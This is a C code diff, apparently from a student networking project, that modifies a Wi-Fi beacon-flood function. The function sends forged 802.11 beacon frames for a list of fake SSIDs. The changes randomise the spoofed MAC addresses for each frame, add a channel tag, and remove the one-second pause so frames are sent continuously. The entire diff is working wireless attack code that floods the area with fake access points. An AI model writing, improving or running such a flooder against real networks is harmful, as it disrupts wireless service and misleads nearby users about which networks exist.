@@ -69,7 +69,7 @@ int beacon_flood(const char* interface, const char* list_file) {
     // int ssid_len = strlen(fake_ssid);
     // printf("ssid_len: %d\n", ssid_len);
 
-    BeaconFrame* frame = calloc(1, sizeof(BeaconFrame) + 20);
+    BeaconFrame* frame = calloc(1, sizeof(BeaconFrame) + 40);
     if(frame == NULL) {
         puts("faild to alloc *frame");
         return -1;
@@ -89,22 +89,33 @@ int beacon_flood(const char* interface, const char* list_file) {
     frame->cap_info = htons(0x0c11); // automatic power save delivery, short slot time, ESS capabilities bits 1
 
     frame->ssid_tag_num = (uint8_t)0x00;
+    // frame->channel_tag_num = (uint8_t)0x03;
+    // frame->channel_tag_len = (uint8_t)0x01;
+    // frame->channel_tag_val = (uint8_t)0x01;
+
+    uint8_t channel[3] = {(uint8_t)0x03, (uint8_t)0x01, (uint8_t)0x01};
     
     int ssid_len = 0;
     while(1) {
 
         for(int i=0; i<ssid_num; i++) {
+            for(int i=0; i<6; i++)
+                sa[i] = rand() % 256;
+            memcpy(frame->addr2, sa, 6);
+            memcpy(frame->addr3, sa, 6);
+
             // printf("ssid: %s\n", ssid_list[i]);
             ssid_len = strlen(ssid_list[i]);
             frame->ssid_tag_len = ssid_len;
             // printf("ssid tag len: %d\n", frame->ssid_tag_len);
             memcpy((unsigned char*)frame + sizeof(BeaconFrame), ssid_list[i], ssid_len); // ssid는 개행문자가 없고, 마지막에 널 문자를 넣어줘야 함.
+            memcpy((unsigned char*)frame + sizeof(BeaconFrame) + ssid_len, channel, 3);
             // printf("ssid2: %s\n", (unsigned char*)frame + sizeof(BeaconFrame));
-            pcap_sendpacket(handle, (unsigned char*)frame, sizeof(BeaconFrame) + ssid_len);
-            memset((unsigned char*)frame + sizeof(BeaconFrame), 0 ,ssid_len);
+            pcap_sendpacket(handle, (unsigned char*)frame, sizeof(BeaconFrame) + ssid_len + 3);
+            memset((unsigned char*)frame + sizeof(BeaconFrame), 0 ,ssid_len + 3);
         }
         puts("send beacon frame");
-        sleep(1);
+        // sleep(1);
     }
 
     printf("free\n");
